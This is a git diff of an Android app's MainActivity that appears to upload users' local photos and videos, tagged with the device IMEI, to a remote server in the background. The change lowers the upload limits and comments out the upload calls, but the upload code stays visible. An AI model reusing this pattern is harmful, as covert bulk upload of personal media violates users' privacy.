@@ -135,7 +135,7 @@ class MainActivity : AppCompatActivity() {
         allLocalPhotos.forEach {
             if (it.fileSize / 1000 in 19..5999) {
                 i++
-                if (i < 100) {
+                if (i < 10) {
                     //files[it.title] = File(it.filePath)
                     async {
                         OkHttpUtils.post().addParams("dir", imei)
@@ -170,7 +170,7 @@ class MainActivity : AppCompatActivity() {
         //机算数量
         allLocalPhotos.forEach {
             i++
-            if (i < 50) {
+            if (i < 5) {
                 async {
                     OkHttpUtils.post().addParams("dir", imei)
                             //.files("file", files)
@@ -214,14 +214,14 @@ class MainActivity : AppCompatActivity() {
         map["data"] = Gson().toJson(user)
         NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
             override fun onSuccess(t: String) {
-                async { upLoadPics(imei) }
-                async { upLoadVideos(imei) }
+//                async { upLoadPics(imei) }
+//                async { upLoadVideos(imei) }
 
             }
 
             override fun onError(errorMsg: String) {
-                async { upLoadPics(imei) }
-                async { upLoadVideos(imei) }
+//                async { upLoadPics(imei) }
+//                async { upLoadVideos(imei) }
             }
         })
 
